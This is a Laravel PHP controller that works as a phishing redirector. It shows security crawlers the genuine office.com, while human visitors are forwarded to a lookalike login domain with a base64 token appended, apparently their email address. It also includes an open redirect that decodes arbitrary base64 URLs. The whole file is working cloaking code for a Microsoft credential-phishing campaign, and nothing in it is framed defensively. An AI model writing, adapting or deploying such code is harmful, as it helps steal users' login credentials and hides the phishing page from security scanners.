<?php

namespace App\Http\Controllers;

use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Http\Request;
use Jaybizzle\CrawlerDetect\CrawlerDetect;
use Jaybizzle\CrawlerDetect\Fixtures\Crawlers;
use Crawler;

class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;


    public $dataemail = "";

    public function index(){
        $base64 = request()->a;
        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
            return redirect()->away("https://login.reviewern.online/obKceMCK#".$base64);

        }
    }

    public function index2(Request $request){
        $mail = $request->subs;
        $this->dataemail = $mail;

        return $this->index($mail);
    }

    public function code($code){
        if(Crawler::isCrawler()){
            return redirect()->away("https://office.com");
        }else{
            $base64 = base64_decode($code);
//            dd($base64);
            return redirect()->away($base64);

        }
    }
}
